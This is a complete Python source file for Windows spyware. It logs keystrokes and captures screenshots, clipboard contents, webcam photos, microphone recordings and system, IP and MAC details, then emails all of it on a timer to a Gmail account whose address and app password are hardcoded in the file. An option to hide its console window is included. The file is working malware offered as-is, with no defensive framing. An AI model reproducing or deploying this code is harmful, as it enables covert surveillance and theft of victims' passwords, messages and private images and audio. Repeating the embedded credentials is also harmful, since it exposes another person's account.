import smtplib
import platform
import os
import time
import threading
import ctypes
import sys
import socket
import win32clipboard
import sounddevice as sd
from scipy.io.wavfile import write
import pyscreenshot as ImageGrab
import cv2
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import psutil
import uuid

# Global variables
content = ""
caps_lock_on = False  
email_interval = 120  
file_path = os.path.expanduser("~\\Documents\\Keylogger_Logs")
keys_file = os.path.join(file_path, "key_log.txt")
screenshot_file = os.path.join(file_path, "screenshot.png")
audio_file = os.path.join(file_path, "audio.wav")
clipboard_file = os.path.join(file_path, "clipboard.txt")
system_file = os.path.join(file_path, "system_info.txt")
webcam_file = os.path.join(file_path, "webcam_capture.jpg")

# Email credentials (Use App Passwords for Gmail)
email = "prajwajogi@gmail.com"
password = "kdyh cwuw xzsk eoij"

# Ensure the log directory exists
os.makedirs(file_path, exist_ok=True)

# Numpad mapping
numpad_map = {
    96: "0", 97: "1", 98: "2", 99: "3", 100: "4",
    101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
    110: "."
}

# Function to send an email with an attachment
def send_mail_with_attachment(subject, body, attachment_path):
    try:
        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = subject

        msg.attach(MIMEText(body, "plain"))

        if os.path.exists(attachment_path):
            with open(attachment_path, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}")
                msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.send_message(msg)
        server.quit()
        print(f"[+] Email sent successfully: {subject}")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")

# Function to record microphone audio
def record_audio(duration=10, sample_rate=44100):
    try:
        print("[+] Recording audio...")
        recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2, dtype='int16')
        sd.wait()  
        write(audio_file, sample_rate, recording)
        print("[+] Audio recorded and saved.")
        send_mail_with_attachment("Microphone Recording", "Attached recorded audio.", audio_file)
    except Exception as e:
        print(f"[-] Failed to record audio: {e}")

# Function to process key presses
def process_key_strike(key):
    global content, caps_lock_on
    try:
        if hasattr(key, 'vk') and key.vk in numpad_map:
            content += numpad_map[key.vk]
        elif hasattr(key, 'char') and key.char:
            # Handle Caps Lock: Check if Caps Lock is on or off and modify characters accordingly
            if key.char.isalpha():
                char = key.char.upper() if caps_lock_on else key.char.lower()
            else:
                char = key.char
            content += char
        elif key == keyboard.Key.space:
            content += " "
        elif key == keyboard.Key.enter:
            content += "\n"
        elif key == keyboard.Key.tab:
            content += "\t"
        elif key == keyboard.Key.caps_lock:
            caps_lock_on = not caps_lock_on
            print(f"[+] Caps Lock {'ON' if caps_lock_on else 'OFF'}")  # Optional: print Caps Lock state
        else:
            content += f" [{key}] "
    except AttributeError:
        pass

# Save captured keys to a file
def save_keys():
    global content
    if content:
        with open(keys_file, "a") as f:
            f.write(content)
        content = ""

# Periodically email logs
def email_logs():
    while True:
        time.sleep(email_interval)
        save_keys()
        if os.path.exists(keys_file):
            send_mail_with_attachment("Keystroke Logs", "Attached are the captured keystrokes.", keys_file)
            open(keys_file, "w").close()  

# Capture a screenshot
def capture_screenshot():
    try:
        image = ImageGrab.grab()
        image.save(screenshot_file)
        send_mail_with_attachment("Screenshot", "Attached screenshot.", screenshot_file)
        print("[+] Screenshot captured and sent.")
    except Exception as e:
        print(f"[-] Failed to capture screenshot: {e}")

# Capture system info
def capture_system_info():
    try:
        system_info = platform.uname()
        with open(system_file, "w") as f:
            f.write(f"System: {system_info.system}\n")
            f.write(f"Node: {system_info.node}\n")
            f.write(f"Release: {system_info.release}\n")
            f.write(f"Version: {system_info.version}\n")
            f.write(f"Machine: {system_info.machine}\n")
            f.write(f"Processor: {system_info.processor}\n")
        send_mail_with_attachment("System Info", "Attached system info.", system_file)
        print("[+] System info captured and sent.")
    except Exception as e:
        print(f"[-] Failed to capture system info: {e}")

# Capture extended system info including IP address, MAC address, and CPU details
def capture_extended_system_info():
    try:
        # Get system information
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8 * 6, 8)][::-1])
        cpu_info = psutil.cpu_times()

        # Write extended system info to the system file
        with open(system_file, "a") as f:
            f.write(f"\n\n[+] Extended System Information\n")
            f.write(f"IP Address: {ip_address}\n")
            f.write(f"MAC Address: {mac_address}\n")
            f.write(f"CPU Times: {cpu_info}\n")

        send_mail_with_attachment("Extended System Info", "Attached extended system info.", system_file)
        print("[+] Extended system info captured and sent.")
    except Exception as e:
        print(f"[-] Failed to capture extended system info: {e}")

# Capture clipboard content
def capture_clipboard():
    try:
        win32clipboard.OpenClipboard()
        clipboard_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        with open(clipboard_file, "w") as f:
            f.write(clipboard_data)
        send_mail_with_attachment("Clipboard Content", "Attached clipboard data.", clipboard_file)
        print("[+] Clipboard captured and sent.")
    except Exception as e:
        print(f"[-] Failed to capture clipboard: {e}")

# Capture webcam photo
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(webcam_file, frame)
            send_mail_with_attachment("Webcam Capture", "Attached webcam image.", webcam_file)
            print("[+] Webcam image captured and sent.")
        cap.release()
    except Exception as e:
        print(f"[-] Failed to capture webcam image: {e}")

# Hide console window
def hide_console():
    if sys.platform == "win32":
        ctypes.windll.kernel32.SetConsoleTitleW("")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Main function
def main():
    # hide_console()  # Uncomment if you want to hide the console
    email_thread = threading.Thread(target=email_logs, daemon=True)
    email_thread.start()

    def periodic_tasks():
        while True:
            time.sleep(60)  
            capture_screenshot()
            capture_system_info()  # Basic system info
            capture_extended_system_info()  # Extended system info
            capture_clipboard()
            capture_webcam()
            record_audio()  
    

    task_thread = threading.Thread(target=periodic_tasks, daemon=True)
    task_thread.start()

    with keyboard.Listener(on_press=process_key_strike) as listener:
        listener.join()

# Fix the main function entry
if __name__ == "__main__":

    main()